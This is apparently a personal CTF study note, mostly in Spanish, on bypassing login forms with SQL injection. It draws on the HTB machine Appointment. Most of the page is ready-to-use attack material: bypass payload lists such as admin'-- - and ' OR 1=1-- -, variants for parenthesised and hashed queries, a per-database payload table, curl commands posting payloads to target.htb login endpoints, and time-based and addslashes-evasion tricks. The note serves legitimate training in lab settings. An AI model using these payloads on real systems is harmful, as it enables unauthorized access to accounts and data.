---
tags: [web, sqli]
---

> **SQL Injection (SQLi)** is a code injection technique that exploits vulnerabilities in an application's database layer. This guide focuses on what we've actually practiced — the login panel bypass — and the essential fundamentals.

---

## Quickstart — The Universal Test

```bash
# The 5 characters that flag SQLi in 90% of CTF challenges:
'       # single quote
"       # double quote
\       # backslash (escape char, triggers errors)
)       # closing parenthesis (nested queries)
-- -    # comment (MySQL style)
```

---

## Login Panel Bypass — SQLi en formularios de login

El patrón típico de una query de login vulnerable es:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

Si la app concatena tu input directamente sin sanitizar, puedes manipular la lógica SQL para autenticarte sin credenciales válidas. El objetivo es hacer que la condición `WHERE` siempre evalúe a `TRUE`.

### Paso 1 — Entender el contexto de inyección

Prueba **ambos campos** (username y password) por separado:

```bash
# Test 1: ¿Error con single quote en username?
Username: admin'
Password: test

# Test 2: ¿Error con double quote?
Username: admin"
Password: test

# Test 3: ¿Error en el campo password?
Username: admin
Password: test'

# Test 4: ¿Backslash?
Username: admin\
Password: test
```

> 💡 **Si ves un error SQL** → la app es vulnerable y sabes dónde inyectar.
> 💡 **Si no ves error pero la página cambia** (ej. "Wrong password" vs página en blanco) → posible boolean blind.
> 💡 **Si no hay diferencia visible** → prueba time-based blind.
> 💡 **Si no hay errores ni cambios pero el login funciona con `admin'-- -`** → la app es silenciosamente vulnerable — el SQL injection funcionó pero los errores están suprimidos. Este es el escenario CTF más común.

### Ejemplo real — HTB Appointment

Este bypass exacto funciona en la máquina **Appointment**:

```
1. Login form con username + password
2. Gobuster no revela paths ocultos → el login ES la superficie de ataque
3. Test: admin' en username → sin error visible
4. Payload: admin'-- - en username, contraseña vacía → ✅ LOGIN
5. Query subyacente: SELECT * FROM users WHERE username='admin'-- -' AND password=''
6. El -- - comenta el password check → autenticado como admin
```

**Lecciones clave de Appointment:**
- **Sin error ≠ sin vulnerabilidad** — la inyección funcionó silenciosamente
- **Gobuster primero** — confirma que no hay endpoints ocultos antes de enfocarte en el login
- **`admin'-- -` con contraseña vacía** — prueba esto antes que cualquier payload complejo
- **La flag estaba en el dashboard** — sin escalada de privilegios, sin lectura de archivos

### Paso 2 — Payloads clásicos de bypass

Prueba estos en el campo **username**, dejando la contraseña vacía o con cualquier valor:

```sql
-- Payloads universales (funcionan en MySQL, PostgreSQL, MSSQL)
admin'-- -
admin'#
admin'/*
' OR 1=1-- -
' OR '1'='1'-- -
' OR '1'='1'#
' OR '1'='1'/*
" OR "1"="1"-- -
" OR 1=1-- -
') OR ('1'='1
') OR 1=1-- -
admin' OR '1'='1

-- Sin conocer ningún username — OR devuelve el primer usuario
' OR '1'='1'-- -
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*
OR 1=1-- -
OR '1'='1'-- -

-- Admin-specific — si sabes que el usuario admin existe
admin'-- -
admin' #
admin'/*
```

### Paso 3 — Si hay paréntesis en la query

Muchas apps usan funciones como `MD5()`, `SHA1()`, o simplemente paréntesis:

```sql
-- Ejemplo de query vulnerable con hash:
-- SELECT * FROM users WHERE (username='$user') AND (password=MD5('$pass'))

') OR 1=1-- -
') OR ('1'='1
') OR 1=1#
') OR ('1'='1')-- -

-- Doble paréntesis
')) OR 1=1-- -
')) OR ('1'='1

-- Con hash en password
admin')-- -
') OR 1=1) AND ('x'='x
' OR 1=1) AND MD5('x')=MD5('x
```

### Payloads específicos por DBMS

| DBMS | Payload | Nota |
| :--- | :------ | :--- |
| **MySQL** | `admin'-- -` | Espacio después de `--` es obligatorio |
| **MySQL** | `admin'#` | `#` no necesita espacio |
| **MySQL** | `admin'/*` | Comentario inline sin cerrar |
| **PostgreSQL** | `admin'--` | `--` sin espacio extra |
| **PostgreSQL** | `admin'/**/` | Comentario inline |
| **MSSQL** | `admin'--` | Igual que PostgreSQL |
| **Oracle** | `admin'--` | Oracle `--` necesita espacio |
| **SQLite** | `admin'--` | `--` con o sin espacio |

---

## Quick checklist para formularios de login

1. **Test `'` en username** → si hay error SQL → vulnerable
2. **`admin'-- -`** → bypass clásico si admin existe
3. **`' OR 1=1-- -`** → bypass sin conocer un username
4. **`') OR 1=1-- -`** → si hay paréntesis
5. **`' OR 1=1#`** → comentario alternativo
6. **Si nada funciona** → prueba time-based blind con `SLEEP()`
7. **No olvides el campo password** → a veces es vulnerable aunque username no lo sea

### curl para testear formularios manualmente

```bash
# POST básico
curl -d "user=admin'-- -&pass=" http://target.htb/login.php
curl -d "user=' OR 1=1-- -&pass=" http://target.htb/login.php

# Con --data-urlencode si necesitas encoding explícito
curl --data-urlencode "user=' OR 1=1-- -" --data-urlencode "pass=" http://target.htb/login.php

# JSON login
curl -X POST http://target.htb/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"'-- -","password":"test"}'

# Seguir redirects y mostrar headers (para ver session Set-Cookie)
curl -d "user=admin'-- -&pass=" http://target.htb/login.php -L -v
```

---

## Errores comunes en CTFs

| Error | Solución |
| :---- | :------ |
| Single quotes no rompen la query | Prueba double quotes, backslash, paréntesis, o sin quote (contexto integer) |
| El comentario no funciona | Prueba `-- -`, `--`, `#`, `/**/`, o `;` (stacked) |
| Sin diferencia visible entre true/false | Prueba time-based: `' OR IF(1=1,SLEEP(3),0)-- -` |
| El servidor usa `addslashes()` / magic quotes | Prueba `admin\' OR 1=1-- -` (backslash escapa el escape) |

---

## 🔗 Related

**Machines:** [[📅 Appointment]]

**Guides:** [[🐬 MySQL]], [[💣 Gobuster]]

---

## References

- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
